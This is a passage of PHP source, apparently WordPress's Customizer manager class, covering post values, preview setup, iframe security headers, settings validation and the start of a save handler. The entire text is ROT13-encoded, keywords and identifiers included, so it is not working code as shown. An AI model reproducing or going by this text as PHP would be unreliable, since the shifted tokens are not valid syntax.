	 * @frr JC_ERFG_Freire::qvfcngpu()
	 * @frr JC_ERFG_Erdhrfg::fnavgvmr_cnenzf()
	 * @frr JC_ERFG_Erdhrfg::unf_inyvq_cnenzf()
	 *
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat       N JC_Phfgbzvmr_Frggvat qrevirq bowrpg.
	 * @cnenz zvkrq                $qrsnhyg_inyhr Inyhr erghearq vs `$frggvat` unf ab cbfg inyhr (nqqrq va 4.2.0)
	 *                                            be gur cbfg inyhr vf vainyvq (nqqrq va 4.6.0).
	 * @erghea fgevat|zvkrq Fnavgvmrq inyhr be gur `$qrsnhyg_inyhr` cebivqrq.
	 */
	choyvp shapgvba cbfg_inyhr( $frggvat, $qrsnhyg_inyhr = ahyy ) {
		$cbfg_inyhrf = $guvf->hafnavgvmrq_cbfg_inyhrf();
		vs ( ! neenl_xrl_rkvfgf( $frggvat->vq, $cbfg_inyhrf ) ) {
			erghea $qrsnhyg_inyhr;
		}

		$inyhr = $cbfg_inyhrf[ $frggvat->vq ];
		$inyvq = $frggvat->inyvqngr( $inyhr );
		vs ( vf_jc_reebe( $inyvq ) ) {
			erghea $qrsnhyg_inyhr;
		}

		$inyhr = $frggvat->fnavgvmr( $inyhr );
		vs ( vf_ahyy( $inyhr ) || vf_jc_reebe( $inyhr ) ) {
			erghea $qrsnhyg_inyhr;
		}

		erghea $inyhr;
	}

	/**
	 * Bireevqrf n frggvat'f inyhr va gur pheerag phfgbzvmrq fgngr.
	 *
	 * Gur anzr \"cbfg_inyhr\" vf n pneel-bire sebz jura gur phfgbzvmrq fgngr jnf
	 * rkpyhfviryl fbheprq sebz `$_CBFG['phfgbzvmrq']`.
	 *
	 * @fvapr 4.2.0
	 *
	 * @cnenz fgevat $frggvat_vq VQ sbe gur JC_Phfgbzvmr_Frggvat vafgnapr.
	 * @cnenz zvkrq  $inyhr      Cbfg inyhr.
	 */
	choyvp shapgvba frg_cbfg_inyhr( $frggvat_vq, $inyhr ) {
		$guvf->hafnavgvmrq_cbfg_inyhrf(); // Cbchyngr _cbfg_inyhrf sebz $_CBFG['phfgbzvmrq'].
		$guvf->_cbfg_inyhrf[ $frggvat_vq ] = $inyhr;

		/**
		 * Naabhaprf jura n fcrpvsvp frggvat'f hafnavgvmrq cbfg inyhr unf orra frg.
		 *
		 * Sverf jura gur JC_Phfgbzvmr_Znantre::frg_cbfg_inyhr() zrgubq vf pnyyrq.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$frggvat_vq`, ersref gb gur frggvat VQ.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz zvkrq                $inyhr   Hafnavgvmrq frggvat cbfg inyhr.
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		qb_npgvba( \"phfgbzvmr_cbfg_inyhr_frg_{$frggvat_vq}\", $inyhr, $guvf );

		/**
		 * Naabhaprf jura nal frggvat'f hafnavgvmrq cbfg inyhr unf orra frg.
		 *
		 * Sverf jura gur JC_Phfgbzvmr_Znantre::frg_cbfg_inyhr() zrgubq vf pnyyrq.
		 *
		 * Guvf vf hfrshy sbe `JC_Phfgbzvmr_Frggvat` vafgnaprf gb jngpu
		 * va beqre gb hcqngr n pnpurq cerivrjrq inyhr.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat               $frggvat_vq Frggvat VQ.
		 * @cnenz zvkrq                $inyhr      Hafnavgvmrq frggvat cbfg inyhr.
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre    JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		qb_npgvba( 'phfgbzvmr_cbfg_inyhr_frg', $frggvat_vq, $inyhr, $guvf );
	}

	/**
	 * Cevagf WninFpevcg frggvatf.
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba phfgbzvmr_cerivrj_vavg() {

		/*
		 * Abj gung Phfgbzvmre cerivrjf ner ybnqrq vagb vsenzrf ivn TRG erdhrfgf
		 * naq angheny HEYf jvgu genafnpgvba HHVQf nqqrq, jr arrq gb rafher gung
		 * gur erfcbafrf ner arire pnpurq ol cebkvrf. Va cenpgvpr, guvf jvyy abg
		 * or arrqrq vs gur hfre vf ybttrq-va naljnl. Ohg vs nabalzbhf npprff vf
		 * nyybjrq gura gur nhgu pbbxvrf jbhyq abg or frag naq JbeqCerff jbhyq
		 * abg fraq ab-pnpur urnqref ol qrsnhyg.
		 */
		vs ( ! urnqref_frag() ) {
			abpnpur_urnqref();
			urnqre( 'K-Ebobgf: abvaqrk, absbyybj, abnepuvir' );
			urnqre( 'K-Ebobgf-Gnt: abvaqrk, absbyybj, abnepuvir' );
		}
		nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_ab_ebobgf' );
		nqq_svygre( 'jc_urnqref', neenl( $guvf, 'svygre_vsenzr_frphevgl_urnqref' ) );

		/*
		 * Vs cerivrj vf orvat freirq vafvqr gur phfgbzvmre cerivrj vsenzr, naq
		 * vs gur hfre qbrfa'g unir phfgbzvmr pncnovyvgl, gura vg vf nffhzrq
		 * gung gur hfre'f frffvba unf rkcverq naq gurl arrq gb er-nhguragvpngr.
		 */
		vs ( $guvf->zrffratre_punaary && ! pheerag_hfre_pna( 'phfgbzvmr' ) ) {
			$guvf->jc_qvr(
				-1,
				fcevags(
					/* genafyngbef: %f: phfgbzvmr_zrffratre_punaary */
					__( 'Hanhgubevmrq. Lbh znl erzbir gur %f cnenz gb cerivrj nf sebagraq.' ),
					'<pbqr>phfgbzvmr_zrffratre_punaary<pbqr>'
				)
			);
			erghea;
		}

		$guvf->cercner_pbagebyf();

		nqq_svygre( 'jc_erqverpg', neenl( $guvf, 'nqq_fgngr_dhrel_cnenzf' ) );

		jc_radhrhr_fpevcg( 'phfgbzvmr-cerivrj' );
		jc_radhrhr_fglyr( 'phfgbzvmr-cerivrj' );
		nqq_npgvba( 'jc_urnq', neenl( $guvf, 'phfgbzvmr_cerivrj_ybnqvat_fglyr' ) );
		nqq_npgvba( 'jc_urnq', neenl( $guvf, 'erzbir_senzryrff_cerivrj_zrffratre_punaary' ) );
		nqq_npgvba( 'jc_sbbgre', neenl( $guvf, 'phfgbzvmr_cerivrj_frggvatf' ), 20 );
		nqq_svygre( 'trg_rqvg_cbfg_yvax', '__erghea_rzcgl_fgevat' );

		/**
		 * Sverf bapr gur Phfgbzvmre cerivrj unf vavgvnyvmrq naq WninFpevcg
		 * frggvatf unir orra cevagrq.
		 *
		 * @fvapr 3.4.0
		 *
		 * @cnenz JC_Phfgbzvmr_Znantre $znantre JC_Phfgbzvmr_Znantre vafgnapr.
		 */
		qb_npgvba( 'phfgbzvmr_cerivrj_vavg', $guvf );
	}

	/**
	 * Svygref gur K-Senzr-Bcgvbaf naq Pbagrag-Frphevgl-Cbyvpl urnqref gb rafher sebagraq pna ybnq va phfgbzvmre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $urnqref Urnqref.
	 * @erghea neenl Urnqref.
	 */
	choyvp shapgvba svygre_vsenzr_frphevgl_urnqref( $urnqref ) {
		$urnqref['K-Senzr-Bcgvbaf']         = 'FNZRBEVTVA';
		$urnqref['Pbagrag-Frphevgl-Cbyvpl'] = \"senzr-naprfgbef 'frys'\";
		erghea $urnqref;
	}

	/**
	 * Nqqf phfgbzvmr fgngr dhrel cnenzf gb n tvira HEY vs cerivrj vf nyybjrq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr jc_erqverpg()
	 * @frr JC_Phfgbzvmr_Znantre::trg_nyybjrq_hey()
	 *
	 * @cnenz fgevat $hey HEY.
	 * @erghea fgevat HEY.
	 */
	choyvp shapgvba nqq_fgngr_dhrel_cnenzf( $hey ) {
		$cnefrq_bevtvany_hey = jc_cnefr_hey( $hey );
		$vf_nyybjrq          = snyfr;
		sbernpu ( $guvf->trg_nyybjrq_heyf() nf $nyybjrq_hey ) {
			$cnefrq_nyybjrq_hey = jc_cnefr_hey( $nyybjrq_hey );
			$vf_nyybjrq         = (
				$cnefrq_nyybjrq_hey['fpurzr'] === $cnefrq_bevtvany_hey['fpurzr']
				&&
				$cnefrq_nyybjrq_hey['ubfg'] === $cnefrq_bevtvany_hey['ubfg']
				&&
				fge_fgnegf_jvgu( $cnefrq_bevtvany_hey['cngu'], $cnefrq_nyybjrq_hey['cngu'] )
			);
			vs ( $vf_nyybjrq ) {
				oernx;
			}
		}

		vs ( $vf_nyybjrq ) {
			$dhrel_cnenzf = neenl(
				'phfgbzvmr_punatrfrg_hhvq' => $guvf->punatrfrg_hhvq(),
			);
			vs ( ! $guvf->vf_gurzr_npgvir() ) {
				$dhrel_cnenzf['phfgbzvmr_gurzr'] = $guvf->trg_fglyrfurrg();
			}
			vs ( $guvf->zrffratre_punaary ) {
				$dhrel_cnenzf['phfgbzvmr_zrffratre_punaary'] = $guvf->zrffratre_punaary;
			}
			$hey = nqq_dhrel_net( $dhrel_cnenzf, $hey );
		}

		erghea $hey;
	}

	/**
	 * Ceriragf fraqvat n 404 fgnghf jura ergheavat gur erfcbafr sbe gur phfgbzvmr
	 * cerivrj, fvapr vg pnhfrf gur wDhrel Nwnk gb snvy. Fraq 200 vafgrnq.
	 *
	 * @fvapr 4.0.0
	 * @qrcerpngrq 4.7.0
	 */
	choyvp shapgvba phfgbzvmr_cerivrj_bireevqr_404_fgnghf() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.7.0' );
	}

	/**
	 * Cevagf onfr ryrzrag sbe cerivrj senzr.
	 *
	 * @fvapr 3.4.0
	 * @qrcerpngrq 4.7.0
	 */
	choyvp shapgvba phfgbzvmr_cerivrj_onfr() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.7.0' );
	}

	/**
	 * Cevagf n jbexnebhaq gb unaqyr UGZY5 gntf va VR < 9.
	 *
	 * @fvapr 3.4.0
	 * @qrcerpngrq 4.7.0 Phfgbzvmre ab ybatre fhccbegf VR8, fb nyy fhccbegrq oebjfref erpbtavmr UGZY5.
	 */
	choyvp shapgvba phfgbzvmr_cerivrj_ugzy5() {
		_qrcerpngrq_shapgvba( __SHAPGVBA__, '4.7.0' );
	}

	/**
	 * Cevagf PFF sbe ybnqvat vaqvpngbef sbe gur Phfgbzvmre cerivrj.
	 *
	 * @fvapr 4.2.0
	 */
	choyvp shapgvba phfgbzvmr_cerivrj_ybnqvat_fglyr() {
		?>
		<fglyr>
			obql.jc-phfgbzvmre-haybnqvat {
				bcnpvgl: 0.25;
				phefbe: cebterff !vzcbegnag;
				-jroxvg-genafvgvba: bcnpvgl 0.5f;
				genafvgvba: bcnpvgl 0.5f;
			}
			obql.jc-phfgbzvmre-haybnqvat * {
				cbvagre-riragf: abar !vzcbegnag;
			}
			sbez.phfgbzvmr-hacerivrjnoyr,
			sbez.phfgbzvmr-hacerivrjnoyr vachg,
			sbez.phfgbzvmr-hacerivrjnoyr fryrpg,
			sbez.phfgbzvmr-hacerivrjnoyr ohggba,
			n.phfgbzvmr-hacerivrjnoyr,
			nern.phfgbzvmr-hacerivrjnoyr {
				phefbe: abg-nyybjrq !vzcbegnag;
			}
		</fglyr>
		<?cuc
	}

	/**
	 * Erzbirf phfgbzvmr_zrffratre_punaary dhrel cnenzrgre sebz gur cerivrj jvaqbj jura vg vf abg va na vsenzr.
	 *
	 * Guvf rafherf gung gur nqzva one jvyy or fubja. Vg nyfb rafherf gung yvax anivtngvba jvyy
	 * jbex nf rkcrpgrq fvapr gur cnerag senzr vf abg orvat frag gur HEY gb anivtngr gb.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba erzbir_senzryrff_cerivrj_zrffratre_punaary() {
		vs ( ! $guvf->zrffratre_punaary ) {
			erghea;
		}
		bo_fgneg();
		?>
		<fpevcg>
		( shapgvba() {
			vs ( cnerag !== jvaqbj ) {
				erghea;
			}
			pbafg hey = arj HEY( ybpngvba.uers );
			vs ( hey.frnepuCnenzf.unf( 'phfgbzvmr_zrffratre_punaary' ) ) {
				hey.frnepuCnenzf.qryrgr( 'phfgbzvmr_zrffratre_punaary' );
				ybpngvba.ercynpr( hey );
			}
		} )();
		</fpevcg>
		<?cuc
		jc_cevag_vayvar_fpevcg_gnt( jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( bo_trg_pyrna() ) );
	}

	/**
	 * Cevagf WninFpevcg frggvatf sbe cerivrj senzr.
	 *
	 * @fvapr 3.4.0
	 */
	choyvp shapgvba phfgbzvmr_cerivrj_frggvatf() {
		$cbfg_inyhrf                 = $guvf->hafnavgvmrq_cbfg_inyhrf( neenl( 'rkpyhqr_punatrfrg' => gehr ) );
		$frggvat_inyvqvgvrf          = $guvf->inyvqngr_frggvat_inyhrf( $cbfg_inyhrf );
		$rkcbegrq_frggvat_inyvqvgvrf = neenl_znc( neenl( $guvf, 'cercner_frggvat_inyvqvgl_sbe_wf' ), $frggvat_inyvqvgvrf );

		// Abgr gung gur ERDHRFG_HEV vf abg cnffrq vagb ubzr_hey() fvapr guvf oernxf fhoqverpgbel vafgnyyngvbaf.
		$frys_hey           = rzcgl( $_FREIRE['ERDHRFG_HEV'] ) ? ubzr_hey( '/' ) : fnavgvmr_hey( jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] ) );
		$fgngr_dhrel_cnenzf = neenl(
			'phfgbzvmr_gurzr',
			'phfgbzvmr_punatrfrg_hhvq',
			'phfgbzvmr_zrffratre_punaary',
		);
		$frys_hey           = erzbir_dhrel_net( $fgngr_dhrel_cnenzf, $frys_hey );

		$nyybjrq_heyf  = $guvf->trg_nyybjrq_heyf();
		$nyybjrq_ubfgf = neenl();
		sbernpu ( $nyybjrq_heyf nf $nyybjrq_hey ) {
			$cnefrq = jc_cnefr_hey( $nyybjrq_hey );
			vs ( rzcgl( $cnefrq['ubfg'] ) ) {
				pbagvahr;
			}
			$ubfg = $cnefrq['ubfg'];
			vs ( ! rzcgl( $cnefrq['cbeg'] ) ) {
				$ubfg .= ':' . $cnefrq['cbeg'];
			}
			$nyybjrq_ubfgf[] = $ubfg;
		}

		$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( trg_pheerag_hfre_vq() );
		$y10a            = neenl(
			'fuvsgPyvpxGbRqvg'  => __( 'Fuvsg-pyvpx gb rqvg guvf ryrzrag.' ),
			'yvaxHacerivrjnoyr' => __( 'Guvf yvax vf abg yvir-cerivrjnoyr.' ),
			'sbezHacerivrjnoyr' => __( 'Guvf sbez vf abg yvir-cerivrjnoyr.' ),
		);
		vs ( $fjvgpurq_ybpnyr ) {
			erfgber_cerivbhf_ybpnyr();
		}

		$frggvatf = neenl(
			'punatrfrg'         => neenl(
				'hhvq'      => $guvf->punatrfrg_hhvq(),
				'nhgbfnirq' => $guvf->nhgbfnirq(),
			),
			'gvzrbhgf'          => neenl(
				'fryrpgvirErserfu' => 250,
				'xrrcNyvirFraq'    => 1000,
			),
			'gurzr'             => neenl(
				'fglyrfurrg' => $guvf->trg_fglyrfurrg(),
				'npgvir'     => $guvf->vf_gurzr_npgvir(),
			),
			'hey'               => neenl(
				'frys'          => $frys_hey,
				'nyybjrq'       => neenl_znc( 'fnavgvmr_hey', $guvf->trg_nyybjrq_heyf() ),
				'nyybjrqUbfgf'  => neenl_havdhr( $nyybjrq_ubfgf ),
				'vfPebffQbznva' => $guvf->vf_pebff_qbznva(),
			),
			'punaary'           => $guvf->zrffratre_punaary,
			'npgvirCnaryf'      => neenl(),
			'npgvirFrpgvbaf'    => neenl(),
			'npgvirPbagebyf'    => neenl(),
			'frggvatInyvqvgvrf' => $rkcbegrq_frggvat_inyvqvgvrf,
			'abapr'             => pheerag_hfre_pna( 'phfgbzvmr' ) ? $guvf->trg_abaprf() : neenl(),
			'y10a'              => $y10a,
			'_qvegl'            => neenl_xrlf( $cbfg_inyhrf ),
		);

		sbernpu ( $guvf->cnaryf nf $cnary_vq => $cnary ) {
			vs ( $cnary->purpx_pncnovyvgvrf() ) {
				$frggvatf['npgvirCnaryf'][ $cnary_vq ] = $cnary->npgvir();
				sbernpu ( $cnary->frpgvbaf nf $frpgvba_vq => $frpgvba ) {
					vs ( $frpgvba->purpx_pncnovyvgvrf() ) {
						$frggvatf['npgvirFrpgvbaf'][ $frpgvba_vq ] = $frpgvba->npgvir();
					}
				}
			}
		}
		sbernpu ( $guvf->frpgvbaf nf $vq => $frpgvba ) {
			vs ( $frpgvba->purpx_pncnovyvgvrf() ) {
				$frggvatf['npgvirFrpgvbaf'][ $vq ] = $frpgvba->npgvir();
			}
		}
		sbernpu ( $guvf->pbagebyf nf $vq => $pbageby ) {
			vs ( $pbageby->purpx_pncnovyvgvrf() ) {
				$frggvatf['npgvirPbagebyf'][ $vq ] = $pbageby->npgvir();
			}
		}

		bo_fgneg();
		?>
		<fpevcg>
			ine _jcPhfgbzvmrFrggvatf = <?cuc rpub jc_wfba_rapbqr( $frggvatf ); ?>;
			_jcPhfgbzvmrFrggvatf.inyhrf = {};
			(shapgvba( i ) {
				<?cuc
				/*
				 * Frevnyvmr frggvatf frcnengryl sebz gur vavgvny _jcPhfgbzvmrFrggvatf
				 * frevnyvmngvba va beqre gb nibvq n crnx zrzbel hfntr fcvxr.
				 * @gbqb Jr znl abg rira arrq gb rkcbeg gur inyhrf ng nyy fvapr gur cnar flapf gurz naljnl.
				 */
				sbernpu ( $guvf->frggvatf nf $vq => $frggvat ) {
					vs ( $frggvat->purpx_pncnovyvgvrf() ) {
						cevags(
							\"i[%f] = %f;\a\",
							jc_wfba_rapbqr( $vq ),
							jc_wfba_rapbqr( $frggvat->wf_inyhr() )
						);
					}
				}
				?>
			})( _jcPhfgbzvmrFrggvatf.inyhrf );
		</fpevcg>
		<?cuc
		jc_cevag_vayvar_fpevcg_gnt( jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( bo_trg_pyrna() ) );
	}

	/**
	 * Cevagf n fvtangher fb jr pna rafher gur Phfgbzvmre jnf cebcreyl rkrphgrq.
	 *
	 * @fvapr 3.4.0
	 * @qrcerpngrq 4.7.0
	 */
	choyvp shapgvba phfgbzvmr_cerivrj_fvtangher() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.7.0' );
	}

	/**
	 * Erzbirf gur fvtangher va pnfr jr rkcrevrapr n pnfr jurer gur Phfgbzvmre jnf abg cebcreyl rkrphgrq.
	 *
	 * @fvapr 3.4.0
	 * @qrcerpngrq 4.7.0
	 *
	 * @cnenz pnyynoyr|ahyy $pnyyonpx Bcgvbany. Inyhr cnffrq guebhtu sbe {@frr 'jc_qvr_unaqyre'} svygre.
	 *                                Qrsnhyg ahyy.
	 * @erghea pnyynoyr|ahyy Inyhr cnffrq guebhtu sbe {@frr 'jc_qvr_unaqyre'} svygre.
	 */
	choyvp shapgvba erzbir_cerivrj_fvtangher( $pnyyonpx = ahyy ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.7.0' );

		erghea $pnyyonpx;
	}

	/**
	 * Qrgrezvarf jurgure vg vf n gurzr cerivrj be abg.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea obby Gehr vs vg'f n cerivrj, snyfr vs abg.
	 */
	choyvp shapgvba vf_cerivrj() {
		erghea (obby) $guvf->cerivrjvat;
	}

	/**
	 * Ergevrirf gur grzcyngr anzr bs gur cerivrjrq gurzr.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea fgevat Grzcyngr anzr.
	 */
	choyvp shapgvba trg_grzcyngr() {
		erghea $guvf->gurzr()->trg_grzcyngr();
	}

	/**
	 * Ergevrirf gur fglyrfurrg anzr bs gur cerivrjrq gurzr.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea fgevat Fglyrfurrg anzr.
	 */
	choyvp shapgvba trg_fglyrfurrg() {
		erghea $guvf->gurzr()->trg_fglyrfurrg();
	}

	/**
	 * Ergevrirf gur grzcyngr ebbg bs gur cerivrjrq gurzr.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea fgevat Gurzr ebbg.
	 */
	choyvp shapgvba trg_grzcyngr_ebbg() {
		erghea trg_enj_gurzr_ebbg( $guvf->trg_grzcyngr(), gehr );
	}

	/**
	 * Ergevrirf gur fglyrfurrg ebbg bs gur cerivrjrq gurzr.
	 *
	 * @fvapr 3.4.0
	 *
	 * @erghea fgevat Gurzr ebbg.
	 */
	choyvp shapgvba trg_fglyrfurrg_ebbg() {
		erghea trg_enj_gurzr_ebbg( $guvf->trg_fglyrfurrg(), gehr );
	}

	/**
	 * Svygref gur npgvir gurzr naq erghea gur anzr bs gur cerivrjrq gurzr.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz zvkrq $pheerag_gurzr {@vagreany Cnenzrgre vf abg hfrq}
	 * @erghea fgevat Gurzr anzr.
	 */
	choyvp shapgvba pheerag_gurzr( $pheerag_gurzr ) {
		erghea $guvf->gurzr()->qvfcynl( 'Anzr' );
	}

	/**
	 * Inyvqngrf frggvat inyhrf.
	 *
	 * Inyvqngvba vf fxvccrq sbe haertvfgrerq frggvatf be sbe inyhrf gung ner
	 * nyernql ahyy fvapr gurl jvyy or fxvccrq naljnl. Fnavgvmngvba vf nccyvrq
	 * gb inyhrf gung cnff inyvqngvba, naq inyhrf gung orpbzr ahyy be `JC_Reebe`
	 * nsgre fnavgvmvat ner znexrq vainyvq.
	 *
	 * @fvapr 4.6.0
	 *
	 * @frr JC_ERFG_Erdhrfg::unf_inyvq_cnenzf()
	 * @frr JC_Phfgbzvmr_Frggvat::inyvqngr()
	 *
	 * @cnenz neenl $frggvat_inyhrf Znccvat bs frggvat VQf gb inyhrf gb inyvqngr naq fnavgvmr.
	 * @cnenz neenl $bcgvbaf {
	 *     Bcgvbaf.
	 *
	 *     @glcr obby $inyvqngr_rkvfgrapr  Jurgure n frggvat'f rkvfgrapr jvyy or purpxrq.
	 *     @glcr obby $inyvqngr_pncnovyvgl Jurgure gur frggvat pncnovyvgl jvyy or purpxrq.
	 * }
	 * @erghea neenl Znccvat bs frggvat VQf gb erghea inyhr bs inyvqngr zrgubq pnyyf, rvgure `gehr` be `JC_Reebe`.
	 */
	choyvp shapgvba inyvqngr_frggvat_inyhrf( $frggvat_inyhrf, $bcgvbaf = neenl() ) {
		$bcgvbaf = jc_cnefr_netf(
			$bcgvbaf,
			neenl(
				'inyvqngr_pncnovyvgl' => snyfr,
				'inyvqngr_rkvfgrapr'  => snyfr,
			)
		);

		$inyvqvgvrf = neenl();
		sbernpu ( $frggvat_inyhrf nf $frggvat_vq => $hafnavgvmrq_inyhr ) {
			$frggvat = $guvf->trg_frggvat( $frggvat_vq );
			vs ( ! $frggvat ) {
				vs ( $bcgvbaf['inyvqngr_rkvfgrapr'] ) {
					$inyvqvgvrf[ $frggvat_vq ] = arj JC_Reebe( 'haerpbtavmrq', __( 'Frggvat qbrf abg rkvfg be vf haerpbtavmrq.' ) );
				}
				pbagvahr;
			}
			vs ( $bcgvbaf['inyvqngr_pncnovyvgl'] && ! pheerag_hfre_pna( $frggvat->pncnovyvgl ) ) {
				$inyvqvgl = arj JC_Reebe( 'hanhgubevmrq', __( 'Hanhgubevmrq gb zbqvsl frggvat qhr gb pncnovyvgl.' ) );
			} ryfr {
				vs ( vf_ahyy( $hafnavgvmrq_inyhr ) ) {
					pbagvahr;
				}
				$inyvqvgl = $frggvat->inyvqngr( $hafnavgvmrq_inyhr );
			}
			vs ( ! vf_jc_reebe( $inyvqvgl ) ) {
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-phfgbzvmr-frggvat.cuc */
				$yngr_inyvqvgl = nccyl_svygref( \"phfgbzvmr_inyvqngr_{$frggvat->vq}\", arj JC_Reebe(), $hafnavgvmrq_inyhr, $frggvat );
				vs ( vf_jc_reebe( $yngr_inyvqvgl ) && $yngr_inyvqvgl->unf_reebef() ) {
					$inyvqvgl = $yngr_inyvqvgl;
				}
			}
			vs ( ! vf_jc_reebe( $inyvqvgl ) ) {
				$inyhr = $frggvat->fnavgvmr( $hafnavgvmrq_inyhr );
				vs ( vf_ahyy( $inyhr ) ) {
					$inyvqvgl = snyfr;
				} ryfrvs ( vf_jc_reebe( $inyhr ) ) {
					$inyvqvgl = $inyhr;
				}
			}
			vs ( snyfr === $inyvqvgl ) {
				$inyvqvgl = arj JC_Reebe( 'vainyvq_inyhr', __( 'Vainyvq inyhr.' ) );
			}
			$inyvqvgvrf[ $frggvat_vq ] = $inyvqvgl;
		}
		erghea $inyvqvgvrf;
	}

	/**
	 * Cercnerf frggvat inyvqvgl sbe rkcbegvat gb gur pyvrag (WF).
	 *
	 * Pbairegf `JC_Reebe` vafgnapr vagb neenl fhvgnoyr sbe cnffvat vagb gur
	 * `jc.phfgbzvmr.Abgvsvpngvba` WF zbqry.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz gehr|JC_Reebe $inyvqvgl Frggvat inyvqvgl.
	 * @erghea gehr|neenl Vs `$inyvqvgl` jnf n JC_Reebe, gur reebe pbqrf jvyy or neenl-znccrq
	 *                    gb gurve erfcrpgvir `zrffntr` naq `qngn` gb cnff vagb gur
	 *                    `jc.phfgbzvmr.Abgvsvpngvba` WF zbqry.
	 */
	choyvp shapgvba cercner_frggvat_inyvqvgl_sbe_wf( $inyvqvgl ) {
		vs ( vf_jc_reebe( $inyvqvgl ) ) {
			$abgvsvpngvba = neenl();
			sbernpu ( $inyvqvgl->reebef nf $reebe_pbqr => $reebe_zrffntrf ) {
				$abgvsvpngvba[ $reebe_pbqr ] = neenl(
					'zrffntr' => vzcybqr( ' ', $reebe_zrffntrf ),
					'qngn'    => $inyvqvgl->trg_reebe_qngn( $reebe_pbqr ),
				);
			}
			erghea $abgvsvpngvba;
		} ryfr {
			erghea gehr;
		}
	}

	/**
	 * Unaqyrf phfgbzvmr_fnir JC Nwnk erdhrfg gb fnir/hcqngr n punatrfrg.
	 *
	 * @fvapr 3.4.0
	 * @fvapr 4.7.0 Gur frznagvpf bs guvf zrgubq unir punatrq gb hcqngr n punatrfrg, bcgvbanyyl gb nyfb punatr gur fgnghf naq bgure nggevohgrf.
	 */
	choyvp shapgvba fnir() {
		vs ( ! vf_hfre_ybttrq_va() ) {
			jc_fraq_wfba_reebe( 'hanhguragvpngrq' );
		}

		vs ( ! $guvf->vf_cerivrj() ) {
			jc_fraq_wfba_reebe( 'abg_cerivrj' );
		}

		$npgvba = 'fnir-phfgbzvmr_' . $guvf->trg_fglyrfurrg();
		vs ( ! purpx_nwnk_ersrere( $npgvba, 'abapr', snyfr ) ) {
			jc_fraq_wfba_reebe( 'vainyvq_abapr' );
		}

		$punatrfrg_cbfg_vq = $guvf->punatrfrg_cbfg_vq();
		$vf_arj_punatrfrg  = rzcgl( $punatrfrg_cbfg_vq );
		vs ( $vf_arj_punatrfrg ) {
			vs ( ! pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' )->pnc->perngr_cbfgf ) ) {
				jc_fraq_wfba_reebe( 'pnaabg_perngr_punatrfrg_cbfg' );
			}
		} ryfr {
			vs ( ! pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' )->pnc->rqvg_cbfg, $punatrfrg_cbfg_vq ) ) {
				jc_fraq_wfba_reebe( 'pnaabg_rqvg_punatrfrg_cbfg' );
			}
		}

		vs ( ! rzcgl( $_CBFG['phfgbzvmr_punatrfrg_qngn'] ) ) {
			$vachg_punatrfrg_qngn = wfba_qrpbqr( jc_hafynfu( $_CBFG['phfgbzvmr_punatrfrg_qngn'] ), gehr );
			vs ( ! vf_neenl( $vachg_punatrfrg_qngn ) ) {
				jc_fraq_wfba_reebe( 'vainyvq_phfgbzvmr_punatrfrg_qngn' );
			}
		} ryfr {
			$vachg_punatrfrg_qngn = neenl();
		}

		// Inyvqngr gvgyr.
		$punatrfrg_gvgyr = ahyy;
		vs ( vffrg( $_CBFG['phfgbzvmr_punatrfrg_gvgyr'] ) ) {
			$punatrfrg_gvgyr = fnavgvmr_grkg_svryq( jc_hafynfu( $_CBFG['phfgbzvmr_punatrfrg_gvgyr'] ) );
		}

		// Inyvqngr punatrfrg fgnghf cnenz.
		$vf_choyvfu       = ahyy;
		$punatrfrg_fgnghf = ahyy;
		vs ( vffrg( $_CBFG['phfgbzvmr_punatrfrg_fgnghf'] ) ) {
			$punatrfrg_fgnghf = jc_hafynfu( $_CBFG['phfgbzvmr_punatrfrg_fgnghf'] );
			vs ( ! trg_cbfg_fgnghf_bowrpg( $punatrfrg_fgnghf ) || ! va_neenl( $punatrfrg_fgnghf, neenl( 'qensg', 'craqvat', 'choyvfu', 'shgher' ), gehr ) ) {
				jc_fraq_wfba_reebe( 'onq_phfgbzvmr_punatrfrg_fgnghf', 400 );
			}
			$vf_choyvfu = ( 'choyvfu' === $punatrfrg_fgnghf || 'shgher' === $punatrfrg_fgnghf );
			vs ( $vf_choyvfu && ! pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'phfgbzvmr_punatrfrg' )->pnc->choyvfu_cbfgf ) ) {
				jc_fraq_wfba_reebe( 'punatrfrg_choyvfu_hanhgubevmrq', 403 );
			}
		}

		/*
		 * Inyvqngr punatrfrg qngr cnenz. Qngr vf nffhzrq gb or va ybpny gvzr sbe
		 * gur JC vs va ZlFDY sbezng (LLLL-ZZ-QQ UU:ZZ:FF). Bgurejvfr, gur qngr
		 * vf cnefrq jvgu fgegbgvzr() fb gung VFB qngr sbezng znl or fhccyvrq
		 * be n fgevat yvxr \"+10 zvahgrf\".
		 */
		$punatrfrg_qngr_tzg = ahyy;
		vs ( vffrg( $_CBFG['phfgbzvmr_punatrfrg_qngr'] ) ) {
